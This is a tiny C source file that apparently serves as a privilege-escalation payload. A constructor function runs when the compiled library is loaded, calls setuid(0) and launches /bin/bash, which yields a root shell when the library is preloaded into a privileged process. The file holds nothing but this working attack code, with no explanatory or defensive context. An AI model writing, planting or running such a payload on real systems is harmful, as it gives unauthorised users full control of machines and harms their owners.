#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void __attribute__((constructor)) init()
{
    setuid(0);
    system("/bin/bash");
}
